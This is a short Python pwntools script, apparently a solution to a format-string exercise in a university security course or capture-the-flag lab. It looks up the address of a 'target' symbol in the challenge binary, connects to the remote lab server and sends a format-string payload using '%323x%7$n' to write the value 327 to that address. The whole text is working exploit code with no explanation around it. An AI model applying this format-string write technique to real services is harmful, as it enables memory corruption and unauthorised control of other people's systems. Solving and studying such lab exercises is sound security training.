from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25194

PROG_NAME = "04_match_value"

elf = ELF(PROG_NAME)
target_address = elf.symbols["target"]
print("Target address: ", target_address)

s = remote(SERVER, PORT)
s.sendline(p32(target_address) + b"%323x%7$n")  # 32 bit = 4 bytes + 323 bytes = 327
print(s.recv())
